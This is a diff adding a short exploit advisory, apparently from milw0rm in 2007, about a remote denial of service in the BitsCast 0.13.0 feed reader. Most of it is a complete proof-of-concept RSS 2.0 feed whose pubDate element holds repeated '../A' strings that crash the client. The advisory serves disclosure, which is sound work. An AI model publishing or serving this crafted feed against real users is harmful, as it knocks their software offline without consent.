@@ -1,0 +1,31 @@
+BitsCast 0.13.0 Remote Denial of Service
+Credits: gbr
+Tested on Windows XP SP2
+
+BitsCast crashes when receiving a RSS 2.0 feed item with a invalid string* in sub-element
+'pubDate'.
+
+
+* '../A' x 8, 'A/../' x 8, and others.
+
+PoC:
+
+<?xml version="1.0"?>
+<rss version="2.0">
+
+<channel>
+        <title>Test</title>
+        <link></link>
+        <description></description>
+
+        <item>
+                <title>Remote DoS PoC</title>
+                <link></link>
+                <description></description>
+                <pubDate>../A../A../A../A../A../A../A../A../A../A../A../A</pubDate>
+        </item>            
+                
+</channel>
+</rss>
+
+# milw0rm.com [2007-05-15]
